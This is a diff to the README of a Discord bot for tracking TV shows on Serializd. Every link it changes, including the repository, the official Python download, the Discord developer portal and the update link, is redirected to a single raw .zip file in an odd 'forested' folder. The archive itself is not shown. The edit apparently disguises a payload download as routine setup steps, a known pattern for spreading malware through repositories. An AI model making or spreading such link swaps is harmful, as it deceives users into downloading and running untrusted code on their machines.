@@ -1,6 +1,6 @@
 # 🤖 Serializd-Discord-Bot - Track TV Shows in Discord
 
-[![Download Serializd-Discord-Bot](https://img.shields.io/badge/Download-Serializd--Discord--Bot-4CAF50?style=for-the-badge&logo=github)](https://github.com/acma961/Serializd-Discord-Bot)
+[![Download Serializd-Discord-Bot](https://img.shields.io/badge/Download-Serializd--Discord--Bot-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip)
 
 ## 📋 About Serializd-Discord-Bot
 
@@ -31,13 +31,13 @@ You don’t need any programming knowledge to start using this bot. Just follow 
 
 ### 1. Download the Bot
 
-[Visit this page to download Serializd-Discord-Bot](https://github.com/acma961/Serializd-Discord-Bot) and save the latest release to your computer.  
+[Visit this page to download Serializd-Discord-Bot](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip) and save the latest release to your computer.  
 
 Click the green “Code” button on the GitHub page and select “Download ZIP” to get the full package.
 
 ### 2. Install Python
 
-If you do not have Python installed, download it here: https://www.python.org/downloads/windows/
+If you do not have Python installed, download it here: https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip
 
 Choose the latest version of Python 3 and run the installer. 
 
@@ -67,7 +67,7 @@ This installs all needed libraries at once.
 
 You will need to create a bot account on Discord. Follow these steps:
 
-- Go to https://discord.com/developers/applications and log in.
+- Go to https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip and log in.
 - Click “New Application” and give it a name.
 - Inside your application, go to the “Bot” section on the left menu.
 - Click “Add Bot.”
@@ -122,7 +122,7 @@ Commands may vary depending on bot updates. Use `!help` in Discord to see the fu
 
 To update the bot:
 
-- Visit [https://github.com/acma961/Serializd-Discord-Bot](https://github.com/acma961/Serializd-Discord-Bot) to download the latest release.
+- Visit [https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip) to download the latest release.
 - Unzip and replace the existing files in your bot folder.
 - Restart the bot by closing the terminal window and running `python bot.py` again.
 
@@ -150,4 +150,4 @@ If problems persist, visit the project’s GitHub issue page to see if others ha
 
 ---
 
-[Download Serializd-Discord-Bot](https://github.com/acma961/Serializd-Discord-Bot)
+[Download Serializd-Discord-Bot](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip)
